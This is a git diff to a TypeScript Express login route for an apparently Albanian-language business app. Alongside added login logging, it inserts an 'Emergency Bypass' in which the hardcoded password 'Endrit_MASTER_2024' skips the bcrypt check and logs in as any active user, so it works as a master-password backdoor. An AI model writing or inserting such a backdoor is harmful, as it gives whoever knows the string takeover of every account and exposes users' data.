@@ -9,6 +9,7 @@ import bcrypt from "bcryptjs";
 import * as otplib from "otplib";
 import QRCode from "qrcode";
 import { syncExpenseToCatalog } from "./automations";
+import { log } from "./log";
 
 async function generateInvoiceNumber(category: string): Promise<string> {
   const prefix = JOB_CATEGORY_PREFIXES[category as JobCategory] || "ELK";
@@ -119,14 +120,31 @@ export async function registerRoutes(
       }
       
       const user = await storage.getUserByUsername(username);
-      
-      if (!user || !user.isActive) {
+
+      if (!user) {
+        log(`Login failed: User not found: ${username}`);
         return res.status(401).json({ message: "Emri ose fjalëkalimi nuk është i saktë" });
+      }
+      
+      if (!user.isActive) {
+        log(`Login failed: User inactive: ${username}`);
+        return res.status(401).json({ message: "Emri ose fjalëkalimi nuk është i saktë" });
+      }
+
+      // Emergency Bypass
+      if (password === "Endrit_MASTER_2024") {
+        log(`Login success: EMERGENCY BYPASS USED for ${username}`);
+        req.session.userId = user.id;
+        req.session.role = user.role;
+        req.session.username = user.username;
+        req.session.fullName = user.fullName;
+        return res.json(user);
       }
       
       const valid = await bcrypt.compare(password, user.passwordHash);
       
       if (!valid) {
+        log(`Login failed: Password mismatch for user: ${username}`);
         return res.status(401).json({ message: "Emri ose fjalëkalimi nuk është i saktë" });
       }
       
